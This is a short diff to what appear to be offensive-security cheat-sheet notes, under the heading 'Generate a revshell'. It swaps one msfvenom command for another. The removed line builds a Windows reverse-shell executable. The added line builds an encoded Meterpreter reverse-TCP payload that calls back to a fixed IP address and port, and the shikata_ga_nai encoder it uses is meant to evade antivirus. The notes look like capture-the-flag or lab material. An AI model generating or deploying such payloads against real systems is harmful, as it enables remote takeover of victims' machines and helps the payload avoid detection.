@@ -8,7 +8,7 @@
 
 ## Generate a revshell
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.11.66.218 LPORT=4444 -f exe > evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.66.218 LPORT=1234 -f exe -o exp.exe
 ```
 
 ## Upload a file
